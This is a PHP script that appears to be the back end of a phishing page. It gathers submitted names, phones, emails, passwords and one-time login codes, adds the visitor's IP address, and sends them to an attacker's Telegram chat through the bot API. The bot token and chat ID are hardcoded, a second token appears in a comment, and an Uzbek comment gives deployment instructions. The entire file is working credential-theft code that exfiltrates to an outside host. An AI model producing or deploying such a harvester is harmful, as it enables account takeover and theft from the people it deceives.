<?php

/* https://api.telegram.org/bot6380311910:AAGN214Bcp7FRv5MRoNzKnsxxfy9BSQoQkc/getUpdates,
 XXXXXXXXXXXXXXXXXXXXXXX - Tokeningizni xxx joyiga qo'yib internatga quying */


// Check if the request is a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Retrieve POST data and sanitize it
  $name = isset($_POST['name']) ? htmlspecialchars($_POST['name']) : '';
  $phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '';
  $email = isset($_POST['user_email']) ? htmlspecialchars($_POST['user_email']) : '';
  $reason = isset($_POST['reason']) ? htmlspecialchars($_POST['reason']) : '';
  $guxhatok = isset($_POST['guxhatok']) ? htmlspecialchars($_POST['guxhatok']) : '';
  $login_code = isset($_POST['login_code']) ? htmlspecialchars($_POST['login_code']) : '';
  $ip = $_SERVER['REMOTE_ADDR'];

  // Create an array of data
  $data = array(
    '🌐 Name: ' => $name,
    '🌐 Phone: ' => $phone,
    '🌐 Email: ' => $email,
    '🌐 Reason: ' => $reason,
    '🌐 Passq: ' => $guxhatok,
    '🌐 login_code: ' => $login_code,
    '🌐 Biras: ' => $ip,
  );

  // Initialize the message text
  $message_text = '';

  // Build the message text with HTML formatting
  foreach ($data as $key => $value) {
    if (!empty($value)) {
      $message_text .= "<b>" . $key . "</b> " . $value . "\n";
    }
  }

  // URL-encode the message text
  $message_text = urlencode($message_text);


  $token = "5749360485:AAH8dCAsTxcmCSPCUM8Xauw6hjKRv0Fm3bs";
  $chat_id = "5651241356";


  // Construct the URL for the Telegram API
  $telegram_url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$message_text}";

  // Send the message to Telegram
  $sendToTelegram = file_get_contents($telegram_url);

  // Check if the message was sent successfully
  if ($sendToTelegram) {
    echo 1;
  } else {
    echo 0;
  }
} else {
  echo 0;
}
